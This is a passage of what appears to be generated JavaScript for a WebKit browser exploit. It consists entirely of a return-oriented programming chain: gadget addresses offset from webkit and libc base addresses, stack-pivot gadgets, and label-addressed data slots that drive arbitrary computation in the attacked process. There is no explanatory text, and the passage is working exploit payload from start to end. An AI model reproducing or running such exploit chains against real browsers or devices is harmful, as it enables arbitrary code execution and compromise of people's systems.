webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1532:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1107760, //L1535
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1535:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1107816, //L1536
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1536:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L1538:
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1107968, //L1540
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1539:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1540:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1108056, //L1542
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1108072, //L1543
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1542:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1543:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1108216, //L1547
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1108184, //L1545
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1108200, //L1546
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1545:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1546:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1547:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1108288, //L1549
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1549:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1108344, //L1550
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1550:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1108424, //L1552
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1552:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1553:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1554:
db([34, 0]); // 0x22
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1108536, //L1555
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1108552, //L1556
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1555:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1556:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1108640, //L1558
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1558:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1108696, //L1559
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1559:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1108768, //L1562
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1562:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1108824, //L1563
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1563:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L1565:
libc_base+782311, //pop rsp
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1108976, //L1567
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1566:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1567:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1109064, //L1569
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1109080, //L1570
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1569:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1570:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1109224, //L1574
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1109192, //L1572
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1109208, //L1573
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1572:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1573:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1574:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1109296, //L1576
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1576:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1109352, //L1577
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1577:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1109432, //L1579
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1579:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1580:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1581:
db([35, 0]); // 0x23
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1109544, //L1582
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1109560, //L1583
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1582:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1583:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1109648, //L1585
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1585:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1109704, //L1586
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1586:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1109776, //L1589
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1589:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1109832, //L1590
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1590:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1109936, //L1593
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1592:
db([24, 0]); // 0x18
set_gadget(libc_base+763368,); //pop rcx
//L1593:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1110024, //L1595
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1110040, //L1596
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1595:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1596:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1110184, //L1600
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1110152, //L1598
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1110168, //L1599
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1598:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1599:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1600:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1110280, //L1602
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1601:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1602:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1110368, //L1604
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1110384, //L1605
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1604:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1605:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1110528, //L1609
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1110496, //L1607
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1110512, //L1608
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1607:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1608:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1609:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1110600, //L1611
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1611:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1110656, //L1612
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1612:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1110736, //L1614
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1614:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1615:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1616:
db([36, 0]); // 0x24
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1110848, //L1617
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1110864, //L1618
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1617:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1618:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1110952, //L1620
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1620:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1111008, //L1621
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1621:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1111080, //L1624
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1624:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1111136, //L1625
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1625:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L1627:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1111288, //L1629
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1628:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1629:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1111376, //L1631
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1111392, //L1632
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1631:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1632:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1111536, //L1636
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1111504, //L1634
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1111520, //L1635
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1634:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1635:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1636:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1111608, //L1638
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1638:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1111664, //L1639
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1639:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1111744, //L1641
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1641:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1642:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1643:
db([37, 0]); // 0x25
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1111856, //L1644
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1111872, //L1645
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1644:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1645:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1111960, //L1647
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1647:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1112016, //L1648
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1648:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1112088, //L1651
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1651:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1112144, //L1652
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1652:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L1654:
libc_base+756185, //mov rsp, rbp ; pop rbp
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1112296, //L1656
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1655:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1656:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1112384, //L1658
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1112400, //L1659
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1658:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1659:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1112544, //L1663
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1112512, //L1661
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1112528, //L1662
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1661:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1662:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1663:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1112616, //L1665
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1665:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1112672, //L1666
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1666:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1112752, //L1668
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1668:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1669:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1670:
db([38, 0]); // 0x26
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1112864, //L1671
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1112880, //L1672
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1671:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1672:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1112968, //L1674
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1674:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1113024, //L1675
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1675:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1113096, //L1678
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1678:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1113152, //L1679
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1679:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1113280, //L1682
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1113264, //L1681
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1681:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1682:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1113384, //L1683
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1113400, //L1684
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L1683:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1684:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1113520, //L1685
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1113504, //L1686
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
